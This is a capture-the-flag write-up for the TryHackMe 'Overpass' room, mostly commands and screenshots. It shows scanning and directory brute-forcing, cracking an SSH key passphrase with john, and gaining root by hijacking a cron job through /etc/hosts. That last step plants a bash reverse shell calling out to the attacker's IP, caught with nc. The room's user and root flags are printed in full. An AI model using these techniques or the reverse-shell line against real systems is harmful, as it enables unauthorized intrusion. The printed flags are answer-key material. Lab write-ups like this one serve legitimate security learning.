# Overpass

{% embed url="https://tryhackme.com/room/overpass" %}
https://tryhackme.com/room/overpass
{% endembed %}

![](../../.gitbook/assets/Overpass.png)

## Task 1 Overpass

#### Hack the machine and get the flag in user.txt

```
rustscan -a 10.10.39.208 -- -n -sVC
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 06-39-31.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-03 06-39-46.png>)

```
gobuster dir -u http://10.10.39.200/ \
             -w /usr/share/dirb/wordlists/common.txt \
             -t128
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 06-45-20.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-03 07-21-40.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-03 07-28-16.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-03 07-28-40.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-03 07-29-40.png>)

```bash
vim i_rsa
chmod 400 id_rsa
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 07-32-38.png>)

```bash
ssh -i id_rsa james@10.10.39.208 
cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 07-34-25.png>)

{% hint style="success" %}
`thm{65c1aaf000506e56996822c6281e6bf7}`
{% endhint %}

#### Escalate your privileges and get the flag in root.txt

```bash
cat /etc/crontab
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 07-57-27.png>)

```bash
wget http://10.6.9.176/linpeas.sh
bash linpeas.sh
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 07-48-59.png>)

```bash
vim /etc/hosts
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 07-51-27.png>)

```bash
mkdir -p /var/www/html/downloads/src/
echo -n 'sh -i >& /dev/tcp/10.6.9.176/4444 0>&1' > /var/www/html/downloads/src/buildscript.sh
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 07-54-37.png>)

```bash
nc -nvlp 4444
cat /root/root.txt
```

{% hint style="success" %}
`thm{7f336f8c359dbac18d54fdd64ea753bb}`
{% endhint %}

## BTW

![](<../../.gitbook/assets/Screenshot from 2022-04-03 06-46-02.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-03 07-42-09.png>)
